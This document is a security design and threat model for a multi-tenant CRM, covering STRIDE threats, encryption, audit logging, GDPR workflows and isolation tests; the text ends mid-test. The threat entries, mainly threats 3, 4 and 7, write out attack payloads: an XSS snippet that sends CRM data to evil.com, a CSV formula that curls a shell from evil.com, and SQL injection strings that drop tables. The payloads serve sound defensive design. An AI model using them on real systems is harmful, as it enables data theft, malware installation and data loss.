---
ddx:
  id: CRM-DESIGN-004
  type: security-design
  status: resolved
  depends_on:
    - ADR-001
    - ADR-005
    - ADR-201
  decision_date: 2026-05-18
---

# CRM Security Design & Threat Model

**Status**: Resolved (2026-05-18)

**Scope**: This document details the threat model, mitigation strategies, encryption approach, audit logging contract, and GDPR compliance workflows for the CRM MVP.

**Governing Artifacts**:
- ADR-001: Backend framework (Python + FastAPI)
- ADR-005: Authentication (hand-rolled JWT + workspace isolation)
- ADR-201: GDPR deletion strategy (soft-delete + 90-day grace period)
- crm.prd: Product requirements (R-1 through R-8, including R-8 data export)

---

## 1. Threat Model (STRIDE)

The CRM is a multi-tenant SaaS application with strict workspace isolation requirements. The threat model identifies risks specific to this architecture and sales-team use case.

### Top 10 Threats (STRIDE Analysis)

#### Threat 1: Cross-Workspace Data Leakage via Direct Query Injection

**Category**: Tampering / Information Disclosure  
**Severity**: CRITICAL  
**Description**: A user authenticates to workspace A but bypasses the `workspace_id` filter (via direct API call, raw SQL injection, or middleware bypass) to read workspace B's contacts, opportunities, or activities.

**Attack Vector**:
- Attacker crafts API request: `GET /opportunities?workspace_id=<workspace_B_uuid>` (overrides authenticated user's workspace)
- Raw SQL injection in search endpoint: `name LIKE '%; DELETE FROM contacts; --'`
- Middleware bypass (e.g., authenticated user token reused across workspaces)

**Impact**: Full data breach of another customer's pipeline, contact list, activity history; regulatory liability under GDPR (unauthorized data access).

**Mitigation**:
- **Code Pattern**: Every repository query method MUST extract `workspace_id` from `request.state` (injected by auth middleware), never from user input. Example:
  ```python
  async def get_opportunities(db_session, current_user):
      workspace_id = current_user.workspace_id  # from JWT, immutable
      return db_session.query(Opportunity).filter(
          Opportunity.workspace_id == workspace_id
      )
  ```
- **Validation**: Use SQLAlchemy ORM (parameterized queries); prohibit raw SQL in user-facing endpoints. Code review rule: ✓ no raw SQL without explicit workspace_id parameter check.
- **Testing**: Integration test matrix:
  - Create contact in workspace A; attempt to read from workspace B via direct URL and API
  - Assert 404 or 403 (not 200)
  - Repeat for opportunities, accounts, activities
- **Infrastructure**: Database-level enforcement via row-level security (RLS) policies in PostgreSQL (P1 hardening, not required for MVP)

---

#### Threat 2: Privilege Escalation (Rep Modifying Manager/Admin Records)

**Category**: Elevation of Privilege  
**Severity**: HIGH  
**Description**: A rep (lowest role) circumvents role checks and modifies another user's opportunities or activities, or accesses admin-only features (import/export, user management).

**Attack Vector**:
- Attacker submits PUT request to modify an opportunity owned by another user: `PUT /opportunities/<opp_id>` where the current user's role doesn't permit writes
- Attacker calls admin endpoint directly: `POST /admin/import` while authenticated as rep
- JWT token is forged or modified to claim `role=admin`

**Impact**: Data corruption (reps modify other reps' deals), unauthorized imports, account takeover (reps invite themselves as admins).

**Mitigation**:
- **Code Pattern**: Every endpoint MUST check `current_user.role` and compare against the target resource's ownership or workspace admin status. Use FastAPI dependency injection:
  ```python
  async def verify_admin(current_user: User) -> User:
      if current_user.role != "admin":
          raise HTTPException(status_code=403, detail="Admin role required")
      return current_user
  
  @app.post("/import")
  async def import_csv(_: User = Depends(verify_admin), ...):
      # Only admins can import
  ```
- **Validation**: 
  - Check JWT signature with secure key (never accept unverified tokens)
  - Verify role matches required role for the endpoint
  - Code review: ✓ every POST/PUT/DELETE endpoint has role check
- **Testing**: 
  - Test matrix: rep, manager, admin attempting each privileged operation
  - Verify rep cannot import, export, manage users, or edit opportunities owned by others
- **Monitoring**: Log all privilege checks; alert on repeated failed privilege escalation attempts (potential attack)

---

#### Threat 3: SQL Injection in Search Endpoint

**Category**: Injection (CWE-89)  
**Severity**: HIGH  
**Description**: Attacker enters malicious SQL in the search box (e.g., `name LIKE '%'; DROP TABLE contacts; --'`) and the application concatenates it directly into a SQL query without parameterization.

**Attack Vector**:
- User searches for: `"acme'; DELETE FROM contacts WHERE workspace_id = 'x`
- Unparameterized query: `SELECT * FROM contacts WHERE name LIKE '%<user_input>%'`
- SQL executes, dropping the table

**Impact**: Data loss, denial of service, potential code execution (depending on DB dialect and permissions).

**Mitigation**:
- **Code Pattern**: Use SQLAlchemy ORM for all queries; never concatenate user input into SQL strings.
  ```python
  search_term = request.query_params.get("q", "")
  results = db.query(Contact).filter(
      Contact.workspace_id == workspace_id,
      Contact.name.ilike(f"%{search_term}%")  # ilike is safe; parameterized
  ).all()
  ```
- **Validation**: Use ORM layer exclusively; if raw SQL is unavoidable, bind parameters explicitly (`SELECT * FROM contacts WHERE name LIKE ?`, [search_term]).
- **Testing**: Unit tests with injection payloads (e.g., `'; DROP TABLE --`, `' OR 1=1 --`) must return zero results, never execute arbitrary SQL.
- **Linting**: Use `bandit` (Python security linter) in CI/CD to flag raw SQL strings.

---

#### Threat 4: XSS (Cross-Site Scripting) in Activity Notes or Contact Names

**Category**: Injection (CWE-79)  
**Severity**: HIGH  
**Description**: An attacker enters HTML/JavaScript in an activity body or contact name (e.g., `<img src=x onerror=fetch('https://evil.com/steal?data=')>`). When the frontend renders this unsanitized, the script executes in other users' browsers and exfiltrates data.

**Attack Vector**:
- Attacker logs activity with body: `<img src=x onerror="fetch('/opportunities').then(d => fetch('https://evil.com', {method:'POST', body: d}))">`
- When a manager views this activity, the script executes
- Manager's session token or sensitive data is sent to attacker's server

**Impact**: Session hijacking, data theft, privilege escalation (if admin's browser is compromised).

**Mitigation**:
- **Backend**: Validation only (frontend bears responsibility for rendering). Store user input as plain text; do not HTML-encode in the database.
- **Frontend** (separate concern, but required for security): Enforce on the frontend layer—use a framework that auto-escapes by default (React, Vue) or explicit sanitization:
  ```javascript
  // React example (auto-escaped by default)
  <div>{activity.body}</div>  // Safe; JSX escapes
  
  // If needed to render trusted HTML:
  import DOMPurify from 'dompurify';
  <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(activity.body) }} />
  ```
- **Validation**: Backend allows any text in activity body (no filtering); trust frontend to sanitize. Code review: ✓ frontend escapes or sanitizes user content on render.
- **Testing**: Frontend unit tests with XSS payloads; verify no script execution. Use OWASP ZAP or similar for penetration testing.
- **Content Security Policy (CSP)**: Header `Content-Security-Policy: default-src 'self'; script-src 'self'` prevents inline scripts and external script loads.

---

#### Threat 5: CSRF (Cross-Site Request Forgery) on State-Changing Requests

**Category**: Spoofing (CWE-352)  
**Severity**: MEDIUM  
**Description**: An attacker tricks a logged-in user into visiting a malicious site (e.g., attacker.com). The site makes a cross-origin request (e.g., `POST /opportunities/delete`) on behalf of the user, without the user's knowledge.

**Attack Vector**:
- User is logged into the CRM (has valid session cookie)
- Attacker sends user a link to `attacker.com`
- Attacker's site contains: `<form action="https://crm.example.com/opportunities/123/delete" method="POST"><input type="hidden" name="id" value="123"></form>` (auto-submitted via JavaScript)
- Browser automatically includes CRM session cookie; delete is executed

**Impact**: Unauthorized modifications (deletes, stage changes), data loss.

**Mitigation**:
- **Code Pattern**: Require CSRF tokens for all state-changing requests (POST, PUT, DELETE). FastAPI middleware:
  ```python
  @app.post("/opportunities/{opp_id}/delete")
  async def delete_opportunity(
      opp_id: str,
      csrf_token: str = Form(...),  # Required form field
      current_user: User = Depends(get_current_user)
  ):
      if not verify_csrf_token(csrf_token, current_user.session_id):
          raise HTTPException(status_code=403, detail="CSRF token invalid")
      # Proceed with deletion
  ```
- **Validation**: CSRF token issued on login (stored in session or secure cookie), included in all POST/PUT/DELETE requests, validated server-side before execution.
- **Cookie Flag**: Set `SameSite=Strict` on session cookies to prevent cross-site cookie inclusion:
  ```python
  response.set_cookie("session", token, samesite="strict", httponly=True, secure=True)
  ```
- **Testing**: Integration test: submit state-changing request without CSRF token; verify rejection (403). Include valid token; verify success.

---

#### Threat 6: Insecure Direct Object References (IDOR) in Activity Viewing

**Category**: Broken Access Control (CWE-639)  
**Severity**: HIGH  
**Description**: A user directly accesses an activity record by ID (e.g., `GET /activities/abc123`) without checking if they own or have access to the associated record's workspace.

**Attack Vector**:
- User enumerates activity IDs and requests: `GET /activities/1`, `GET /activities/2`, etc.
- No check is performed to verify the activity belongs to the user's workspace or associated record
- Attacker reads all activities in the system (or another workspace)

**Impact**: Information disclosure (activity history, deal progression, sensitive sales notes).

**Mitigation**:
- **Code Pattern**: Every record fetch by ID MUST include workspace_id filter:
  ```python
  async def get_activity(activity_id: str, current_user: User):
      activity = db.query(Activity).filter(
          Activity.id == activity_id,
          Activity.workspace_id == current_user.workspace_id  # Critical
      ).first()
      if not activity:
          raise HTTPException(status_code=404)
      return activity
  ```
- **Validation**: Code review: ✓ every by-ID fetch includes workspace_id check. No exceptions.
- **Testing**: Integration test: create activity in workspace A, attempt to fetch from workspace B; verify 404. List activities; verify all belong to current workspace.
- **Authorization Layer**: Role-check on top of workspace check (rep can view activities on their records + team records; manager can view team records; admin can view all).

---

#### Threat 7: Bulk Import Injection (CSV Injection via Formulas)

**Category**: Injection (CWE-94)  
**Severity**: MEDIUM  
**Description**: Attacker uploads a CSV with a cell starting with `=`, `+`, `@`, or `-` (e.g., `=cmd|'/c calc'!A1`). When an admin opens the CSV in Excel, the formula executes, potentially downloading malware or exfiltrating data.

**Attack Vector**:
- Attacker uploads contacts CSV with column values like `=cmd|'/c curl https://evil.com/shell > shell.exe'`
- Admin downloads the exported CSV and opens in Excel
- Formula executes, installing malware or opening a backdoor

**Impact**: Compromised admin machine, potential lateral movement into network.

**Mitigation**:
- **Backend Validation**: Strip leading `=`, `+`, `@`, `-` from all imported data:
  ```python
  def sanitize_import_value(value: str) -> str:
      if value and value[0] in ('=', '+', '@', '-'):
          return "'" + value  # Prefix with single quote (Excel escapes formula)
      return value
  ```
- **Export Safety**: When generating CSV exports, apply the same sanitization to prevent injection via export-then-reimport.
- **User Education**: Document in admin guide: "Do not enable automatic formula execution in Excel; open CSVs as raw text if possible."
- **Testing**: Unit tests with injection payloads; verify formulas are escaped or prefixed with single quotes.

---

#### Threat 8: Session Fixation / Token Hijacking

**Category**: Authentication (CWE-384)  
**Severity**: HIGH  
**Description**: An attacker obtains a user's JWT token (via network eavesdropping, compromised device, or social engineering) and uses it to impersonate the user.

**Attack Vector**:
- Attacker intercepts JWT in transit (if TLS is not enforced)
- Attacker steals JWT from browser localStorage or sessionStorage
- Attacker replays the JWT to access the user's workspace and data

**Impact**: Account takeover, data theft, unauthorized modifications.

**Mitigation**:
- **TLS 1.2+ Enforcement**: All communication MUST be encrypted. Server enforces HTTPS-only; HTTP requests are redirected to HTTPS.
  ```python
  app.add_middleware(HTTPSRedirectMiddleware)  # FastAPI middleware
  ```
- **Short-Lived Access Tokens**: JWT access token expires after 15 minutes. After expiry, user must refresh (using refresh token stored in HttpOnly cookie).
  ```json
  {
    "exp": 1715942400,  // 15 min from issue
    "type": "access"
  }
  ```
- **Refresh Token Rotation**: On refresh, issue a new access token and rotate the refresh token. Store refresh tokens in database with revocation support.
- **HttpOnly Cookies**: Refresh token stored in HttpOnly, Secure, SameSite=Strict cookie (not in localStorage). Prevents JavaScript access and cross-site theft.
  ```python
  response.set_cookie("refresh_token", token, httponly=True, secure=True, samesite="strict", max_age=2592000)  # 30 days
  ```
- **Token Revocation**: On logout, mark refresh token as revoked in database. Subsequent refresh attempts fail.
- **Monitoring**: Log all login/logout events. Alert on multiple concurrent sessions from different IPs for the same user.
- **Testing**: Unit tests verify token expiry times. Integration tests verify refresh flow. Penetration test: attempt to use expired token; verify rejection.

---

#### Threat 9: Rate-Limit Bypass / Brute Force on Login Endpoint

**Category**: Denial of Service (CWE-307)  
**Severity**: MEDIUM  
**Description**: An attacker repeatedly submits login attempts with different passwords (brute force) or password reset requests, attempting to compromise a user account or flood the system.

**Attack Vector**:
- Attacker submits 1000 login attempts in 1 minute: `POST /auth/login` with email "user@example.com" and various passwords
- No rate limiting; attacker guesses the password or locks the user out
- Attacker floods password reset endpoint, sending 1000 reset emails to overwhelm the user's inbox

**Impact**: Account compromise (weak passwords), user denial of service (locked out), resource exhaustion.

**Mitigation**:
- **Rate Limiting**: Implement on login and password reset endpoints using `slowapi` (FastAPI-compatible rate limiter):
  ```python
  from slowapi import Limiter
  from slowapi.util import get_remote_address
  
  limiter = Limiter(key_func=get_remote_address)
  app.state.limiter = limiter
  
  @app.post("/auth/login")
  @limiter.limit("5/minute")  # 5 login attempts per minute per IP
  async def login(request: Request, credentials: LoginRequest):
      # Process login
  ```
- **Progressive Backoff**: After 3 failed attempts, increase delay (1s, 2s, 4s). After 5 attempts, lock account temporarily (15 min).
  ```python
  failed_attempts = cache.get(f"login_attempts:{email}", 0)
  if failed_attempts >= 5:
      raise HTTPException(status_code=429, detail="Too many attempts; try again in 15 minutes")
  ```
- **Account Lockout**: After N failed login attempts, disable the account temporarily. Send notification email to user.
- **Testing**: Attempt 10 login requests in 1 minute; verify rate-limit response (429) after 5 attempts. Verify account lockout after N failures.

---

#### Threat 10: Privilege Escalation via GDPR Deletion Bypass

**Category**: Elevation of Privilege / Information Disclosure  
**Severity**: MEDIUM  
**Description**: A rep requests deletion of a contact owned by another rep (not their own contact), or an attacker exploits a missing authorization check in the deletion flow to delete data they shouldn't have access to.

**Attack Vector**:
- Attacker (rep in workspace A) submits: `DELETE /contacts/xyz` where contact xyz belongs to workspace B or is owned by another rep
- No authorization check; contact is deleted without verification
- Rep can delete manager's contacts, or delete contacts across workspaces

**Impact**: Data loss, unauthorized deletions, audit trail confusion (who requested the deletion?).

**Mitigation**:
- **Authorization Check**: Verify the contact belongs to the current user's workspace AND either:
  - User is the contact creator, OR
  - User is a manager or admin
  
  ```python
  async def delete_contact(contact_id: str, current_user: User):
      contact = db.query(Contact).filter(
          Contact.id == contact_id,
          Contact.workspace_id == current_user.workspace_id  # Workspace check
      ).first()
      if not contact:
          raise HTTPException(status_code=404)
      
      # Authorization check
      if current_user.role not in ("manager", "admin") and contact.created_by != current_user.id:
          raise HTTPException(status_code=403, detail="Cannot delete contacts created by others")
      
      contact.is_deleted = True
      contact.deleted_at = datetime.now()
      contact.deleted_by = current_user.id
      db.commit()
  ```
- **Audit Trail**: Log deletion with user who requested it. Deletion cannot be undone by the user; only recovery within grace period (via support).
- **Confirmation Modal**: UI requires explicit confirmation before deletion (client-side UX + server-side authorization).
- **Testing**: Integration test: rep deletes own contact (success), deletes another rep's contact (failure). Manager deletes team member's contact (success).

---

### Summary Table

| Threat | Severity | Mitigation Strategy |
|--------|----------|---------------------|
| 1. Cross-workspace data leakage | CRITICAL | Middleware injects workspace_id; ORM-enforced queries; integration tests |
| 2. Privilege escalation | HIGH | Role checks on every endpoint; JWT signature verification; privilege escalation test matrix |
| 3. SQL injection | HIGH | Parameterized queries (ORM); no raw SQL; bandit linting |
| 4. XSS in activity notes | HIGH | Frontend auto-escaping (React/Vue); CSP header; frontend unit tests |
| 5. CSRF | MEDIUM | CSRF token validation; SameSite=Strict cookies; integration tests |
| 6. IDOR in activities | HIGH | Workspace check on by-ID fetches; role-based authorization; authorization test matrix |
| 7. CSV injection | MEDIUM | Formula sanitization on import/export; Excel safety guide |
| 8. Session hijacking | HIGH | TLS 1.2+; short-lived tokens (15 min); HttpOnly cookies; token revocation; monitoring |
| 9. Brute force / rate limit | MEDIUM | Rate limiting (5/min on login); progressive backoff; account lockout; integration tests |
| 10. Deletion privilege escalation | MEDIUM | Authorization check on delete; audit logging; confirmation modal; integration tests |

---

## 2. Encryption Strategy

### Transit Encryption (In-Flight)

**Standard**: TLS 1.2 or higher (TLS 1.3 preferred)

**Implementation**:
- All HTTP requests must be served over HTTPS
- HTTP requests are redirected to HTTPS (301 permanent redirect)
- Server certificate signed by a trusted CA (Let's Encrypt for MVP, commercial cert for production)
- Certificate renewal automated (90-day rotation for Let's Encrypt)

**Server Configuration**:
```python
# FastAPI + Uvicorn
app.add_middleware(HTTPSRedirectMiddleware)  # Redirect HTTP → HTTPS

# Environment-specific:
# Development: self-signed cert (ngrok or localhost with openssl-generated cert)
# Production: Let's Encrypt wildcard cert auto-renewed
```

**Client Validation**:
- Frontend enforces HTTPS; no mixed content (HTTP + HTTPS)
- CSP header includes `upgrade-insecure-requests` to upgrade insecure requests automatically

**Test Verification**:
- Integration test: Verify HTTP request receives 301 redirect to HTTPS
- SSL Labs grade A minimum (no downgrade attacks, no weak ciphers)
- Certificate pinning optional for P1 (hardening against CA compromise)

---

### At-Rest Encryption

**Password Hashing**:
- Algorithm: bcrypt
- Cost Factor: ≥12 (minimum; recommended 13–14 for 2026)
- Implementation:
  ```python
  from passlib.context import CryptContext
  
  pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto", bcrypt__rounds=12)
  
  # On signup/password change:
  hashed_password = pwd_context.hash(plaintext_password)
  
  # On login:
  if not pwd_context.verify(provided_password, stored_hash):
      raise AuthenticationError()
  ```
- Cost Impact: 12 rounds ≈ 100ms per hash (prevents brute force; user won't notice)
- Storage: 60 bytes per hash (fixed size; PostgreSQL BYTEA field)

**Refresh Token Hashing**:
- Tokens issued to client as plain text (in HttpOnly cookie)
- Server stores hash of token in database (using SHA256)
- On token validation: hash the provided token, compare against stored hash
- Prevents replay if database is compromised (attacker can't reconstruct plain token from hash)

**Database Encryption**:
- PostgreSQL instance encrypted at rest (AWS RDS with KMS encryption, GCP Cloud SQL with encryption, or Azure Database with TDE)
- Transparent Database Encryption (TDE) handles key management; no application changes
- Backup encryption: Automated backups encrypted with same KMS key

**API Keys (P1)** :
- If read-only API keys are added in P1, apply same pattern: issue as plain text, store hash, validate by comparison
- Rotation: API keys expire after 90 days; users receive expiration warning 14 days before

---

### Secure Communication Patterns

**Password Reset Token**:
- Generated: 32 random bytes, base64-encoded to 44 characters
- Stored: SHA256 hash of token in database with 15-minute expiry
- Sent to user: Plain token in email link (user cannot hash what they receive)
- Validation: Hash received token, look up in database, verify expiry
- Security: If email is intercepted, token is still valid. If database is compromised, attacker cannot reverse hash to get token.
- Test: Generate 1000 tokens; verify all unique and not predictable (entropy test)

**CSRF Token**:
- Generated: On login, create 32-byte random token
- Stored: In database (or memcache) with user session ID
- Returned: In response body or meta tag (not cookie, to prevent CSRF)
- Included: In all state-changing requests (hidden form field or header)
- Validated: Verify token matches user's session

---

## 3. Audit Log Contract

**Definition**: An audit log is an immutable record of all security-relevant events and data mutations in the system. Admins can access audit logs for compliance, debugging, and forensics.

### Logged Events

#### Authentication Events
- `user.login.success` — User successfully authenticated
  - Fields: user_id, workspace_id, timestamp, ip_address, user_agent
- `user.login.failure` — Failed login attempt
  - Fields: email, timestamp, ip_address, reason (invalid password, user not found, account locked)
- `user.logout` — User terminated session
  - Fields: user_id, workspace_id, timestamp
- `user.session_expired` — Session token expired
  - Fields: user_id, workspace_id, timestamp
- `user.password_changed` — User changed password
  - Fields: user_id, workspace_id, timestamp, changed_by (self or admin)
- `user.password_reset_requested` — Password reset email sent
  - Fields: email, timestamp, ip_address

#### Authorization Events
- `permission_check.failed` — User attempted action without permission
  - Fields: user_id, workspace_id, action, resource, timestamp
- `privilege_escalation_attempt` — Potential privilege escalation detected
  - Fields: user_id, workspace_id, attempted_role, timestamp, ip_address

#### Data Mutation Events
- `record.created` — New record created (contact, opportunity, activity, etc.)
  - Fields: record_type, record_id, workspace_id, user_id, timestamp, record_summary (name, value, etc.)
- `record.updated` — Record modified
  - Fields: record_type, record_id, workspace_id, user_id, timestamp, changed_fields (old → new), record_summary
- `record.deleted` — Record soft-deleted (GDPR request or admin action)
  - Fields: record_type, record_id, workspace_id, user_id, deleted_at, deletion_reason, grace_period_expiry
- `import.executed` — CSV import completed
  - Fields: workspace_id, user_id, import_type (contacts, opportunities), row_count, timestamp, result (success/partial/failure)
- `export.executed` — CSV export generated
  - Fields: workspace_id, user_id, export_type, row_count, timestamp

#### GDPR Events
- `gdpr.deletion_requested` — User or admin requested data deletion
  - Fields: record_id, record_type, workspace_id, user_id, timestamp, deletion_reason
- `gdpr.data_exported` — Data exported per user request
  - Fields: workspace_id, user_id, export_timestamp, data_scope (all records, deleted only, etc.)
- `gdpr.deletion_purged` — Soft-deleted record hard-deleted after grace period
  - Fields: record_id, record_type, workspace_id, purge_timestamp, grace_period_start

#### Security Events
- `rate_limit.exceeded` — Rate limit triggered (login, password reset)
  - Fields: endpoint, ip_address, timestamp, limit_type (per minute, per hour)
- `account.locked` — Account locked due to multiple failed login attempts
  - Fields: user_id, timestamp, reason
- `csrf.validation_failed` — CSRF token validation failed
  - Fields: user_id, workspace_id, timestamp, ip_address
- `xss_injection_attempt` — Suspected XSS payload detected in input
  - Fields: user_id, workspace_id, endpoint, payload (sanitized), timestamp

### Audit Log Storage & Immutability

**Table Schema**:
```sql
CREATE TABLE audit_log (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  workspace_id UUID NOT NULL REFERENCES workspaces(id),
  event_type VARCHAR(50) NOT NULL,  -- user.login.success, record.created, etc.
  user_id UUID REFERENCES users(id),  -- NULL for system-generated events
  resource_type VARCHAR(50),  -- contact, opportunity, activity, etc.
  resource_id UUID,  -- ID of the modified resource
  details JSONB,  -- Event-specific fields (ip_address, changed_fields, etc.)
  timestamp TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
  created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
  -- Immutability: no update or delete triggers allowed
  CONSTRAINT immutable CHECK (true)  -- Symbolic; enforced in application
);

CREATE UNIQUE INDEX idx_audit_log_workspace_timestamp ON audit_log(workspace_id, timestamp DESC);
CREATE INDEX idx_audit_log_event_type ON audit_log(event_type);
CREATE INDEX idx_audit_log_user_id ON audit_log(user_id);
```

**Immutability Enforcement**:
- No UPDATE or DELETE allowed on audit_log table (enforced via PostgreSQL triggers or application-layer rule)
- Application logs to audit_log table only; never modifies or deletes
- Backup retention: Audit logs retained for 7 years (configurable per compliance requirement)

**Retention Policy**:
- Authentication events: 2 years
- Data mutation events: 7 years (legal hold for tax/contract records)
- GDPR deletion events: Indefinite (proof of compliance)
- Rate-limit events: 90 days (security alerting)

---

### Audit Log Access Control

**Who Can Access**:
- Workspace admin: Full audit log for their workspace (all events, all users)
- Reps/Managers: Cannot access audit log (no visibility into other users' actions)
- Application: Logs events autonomously (no user permission check)

**Audit Log Queries**:
- Admin can filter by event_type, user_id, resource_type, timestamp range
- Query: `SELECT * FROM audit_log WHERE workspace_id = ? AND timestamp > ? ORDER BY timestamp DESC LIMIT 1000`

**Export**:
- Admin can export audit log as CSV for compliance audits
- CSV includes: timestamp, event_type, user_id, resource_type, resource_id, details

---

## 4. GDPR Data Deletion & Portability Workflows

Detailed in ADR-201; summarized here for security design completeness.

### Workflow: GDPR Right-to-Erasure (Article 17)

**Trigger**: User initiates deletion via account settings or admin initiates on behalf of user.

**Process**:
1. **Confirmation Modal**: User clicks "Delete Contact" → modal displays:
   - "This contact and all linked activities will be hidden from your team."
   - "You have 90 days to restore this contact. After 90 days, it will be permanently deleted."
   - Checkbox: "I understand this cannot be undone after 90 days"
   - Buttons: "Cancel", "Delete"

2. **Soft Delete**: On confirmation:
   ```python
   contact.is_deleted = True
   contact.deleted_at = datetime.now()
   contact.deleted_by = current_user.id
   contact.deletion_reason = request.body.reason
   
   # Cascade soft-delete linked records:
   for activity in contact.activities:
       activity.is_deleted = True
       activity.deleted_at = datetime.now()
   
   db.commit()
   audit_log.create(event_type="gdpr.deletion_requested", resource_id=contact.id, ...)
   ```

3. **User Notification**: Confirmation email sent within 1 second:
   - Subject: "Contact Deletion Confirmation"
   - Body:
     ```
     Your contact "John Smith" (john@example.com) has been deleted.
     
     Deletion Date: 2026-05-18T14:32:00Z
     Deletion Transaction ID: txn-abc123
     Grace Period Expiration: 2026-08-16 (90 days)
     
     You can restore this contact within 90 days by contacting support.
     After 90 days, the contact will be permanently deleted and cannot be recovered.
     
     For questions, reply to this email or contact support@[domain].
     ```

4. **Visibility**: Soft-deleted contact is:
   - Hidden from all user queries (rep, manager queries filter `WHERE is_deleted = false`)
   - Removed from list views, pipeline views, search results
   - Visible only in admin-only "Deleted Records" view (for recovery or audit)

5. **Grace Period**: For 90 days, contact can be restored via support request:
   ```python
   # Admin-only restore endpoint:
   contact.is_deleted = False
   contact.deleted_at = NULL
   contact.deleted_by = NULL
   db.commit()
   audit_log.create(event_type="gdpr.deletion_restored", ...)
   ```

6. **Auto-Purge**: After 90 days, automated job runs daily:
   ```python
   # Pseudocode:
   cutoff_date = datetime.now() - timedelta(days=90)
   soft_deleted = db.query(Contact).filter(
       Contact.is_deleted == True,
       Contact.deleted_at < cutoff_date
   ).all()
   
   for contact in soft_deleted:
       # Before deletion, remove PII:
       contact.name = "DELETED"
       contact.email = "DELETED"
       contact.phone = "DELETED"
       
       # Log deletion for compliance:
       audit_log.create(event_type="gdpr.deletion_purged", resource_id=contact.id, ...)
       
       # Hard delete:
       db.delete(contact)
   
   db.commit()
   ```

---

### Workflow: GDPR Data Portability (Article 20)

**Trigger**: User requests export of their data.

**Process**:
1. **Export Request**: User navigates to account settings → "Download My Data" → system generates CSV
2. **Content**: CSV includes all non-deleted records the user has access to:
   - Contacts: name, email, phone, title, account, created_at, updated_at
   - Opportunities: name, account, value, stage, close_date, next_step_date, owner
   - Activities: kind, body, author, occurred_at, record_type, record_id
   - Leads: name, email, phone, company, source, status
3. **Format**: Standard CSV with headers; UTF-8 encoding; one row per record
4. **Delivery**: Email download link (valid for 7 days); file is encrypted with user's password
5. **Deleted Data**: Export excludes soft-deleted records by default; admin can opt-in to include deleted records (with deletion timestamp and reason)

---

### Workflow: GDPR Right-to-Rectification (Article 16)

Not explicitly addressed in MVP but supported by design:
- User can edit their own contact record (name, email, phone, title)
- User cannot edit past activities (immutable); can add clarifying activity (e.g., "Correction: title is actually Senior VP")
- Admin can correct any record on behalf of user; change is audited

---

## 5. Data Export Contract (R-8)

**Definition**: An admin can export any record type as CSV, with specified fields and performance SLA.

### Supported Export Types

#### Contacts Export
**Fields**: id, name, email, phone, title, account_name, created_at, created_by, updated_at, updated_by

**SQL**:
```sql
SELECT
  c.id,
  c.name,
  c.email,
  c.phone,
  c.title,
  a.name AS account_name,
  c.created_at,
  u1.email AS created_by,
  c.updated_at,
  u2.email AS updated_by
FROM contacts c
LEFT JOIN accounts a ON c.account_id = a.id
LEFT JOIN users u1 ON c.created_by = u1.id
LEFT JOIN users u2 ON c.updated_by = u2.id
WHERE c.workspace_id = ? AND c.is_deleted = false
ORDER BY c.created_at DESC;
```

#### Opportunities Export
**Fields**: id, name, account_name, owner_email, value, stage, close_date, next_step_date, next_step_text, created_at, updated_at

**Filters**: Optional by stage, owner, close date range

#### Activities Export
**Fields**: id, kind, body, author_email, occurred_at, record_type, record_id, created_at

#### Accounts Export
**Fields**: id, name, domain, industry, size, created_at, updated_at

#### Leads Export
**Fields**: id, name, email, phone, title, company, source, status, created_at, updated_at

### Performance SLA

- **Export Size**: Up to 100k rows
- **Latency**: <5s (p95) for workspaces ≤100k records
- **Limits**: Export is rate-limited to 1 per 5 minutes per admin (prevent resource exhaustion)

### Format & Encoding

- **Format**: RFC 4180 CSV (comma-separated, newline-delimited)
- **Encoding**: UTF-8 with BOM (ensures Excel compatibility on Windows)
- **Escaping**: Double-quotes escape; fields with commas or quotes are quoted
  - Example: `"John ""Johnny"" Doe","john@example.com"`
- **Header**: First row is column names (user-friendly, not database field names)
- **Missing Values**: Empty string (not NULL or "NULL")

### Deletion Flag in Exports

By default, exports exclude soft-deleted records (`is_deleted = false` filter).

Admin option: Include deleted records with metadata:
- Additional column: `is_deleted` (true/false)
- Additional column: `deleted_at` (timestamp, NULL if not deleted)
- Additional column: `deletion_reason` (user-provided reason, NULL if not deleted)

---

## 6. Cross-Workspace Isolation Testing

### Test Strategy

**Objective**: Verify that a user in workspace A cannot read, modify, or access any data in workspace B.

### Test Cases

#### Test Case 1: Direct API Request with Workspace ID Mismatch
```python
def test_cross_workspace_read_forbidden():
    # Setup: Create 2 workspaces and users
    workspace_a = create_workspace("Team A")
    workspace_b = create_workspace("Team B")
    user_a = create_user(workspace_a, "user_a@example.com", role="rep")
    user_b = create_user(workspace_b, "user_b@example.com", role="rep")
    
    # Create contact in workspace B
    contact_b = create_contact(workspace_b, name="Jane Doe")
    
    # Authenticate as user_a
    token_a = login(user_a.email, "password")
    
    # Attempt to read contact from workspace B
    response = client.get(f"/contacts/{contact_b.id}", headers={"Authorization": f"Bearer {token_a}"})
    
    # Assert: 404 (contact not found in workspace A)
    assert response.status_code == 404
    assert response.json()["detail"] == "Not found"
```

#### Test Case 2: List View Isolation
```python
def test_cross_workspace_list_isolation():
    # Create 2 workspaces with 5 contacts each
    workspace_a = create_workspace("Team A")
    workspace_b = create_workspace("Team B")
    user_a = create_user(workspace_a, "user_a@example.com")
    
    # Create 5 contacts in each workspace
    contacts_a = [create_contact(workspace_a, name=f"Contact A{i}") for i in range(5)]
    contacts_b = [create_contact(workspace_b, name=f"Contact B{i}") for i in range(5)]
    
    # Authenticate as user_a
    token_a = login(user_a.email, "password")
    
    # List contacts
    response = client.get("/contacts", headers={"Authorization": f"Bearer {token_a}"})
    
    # Assert: Only 5 contacts returned (from workspace A)
    assert response.status_code == 200
    assert len(response.json()) == 5
    assert all(c["name"].startswith("Contact A") for c in response.json())
    assert not any(c["name"].startswith("Contact B") for c in response.json())
```

#### Test Case 3: Activity Feed Isolation
```python
def test_cross_workspace_activity_isolation():
    # Create 2 workspaces
    workspace_a = create_workspace("Team A")
    workspace_b = create_workspace("Team B")
    user_a = create_user(workspace_a, "user_a@example.com")
    user_b = create_user(workspace_b, "user_b@example.com")
    
    # Create opportunity and activity in workspace B
    opp_b = create_opportunity(workspace_b, name="Deal B")
    activity_b = create_activity(workspace_b, kind="call", body="Spoke with prospect", record_type="opportunity", record_id=opp_b.id)
    
    # Authenticate as user_a
    token_a = login(user_a.email, "password")
    
    # Attempt to read activity from workspace B
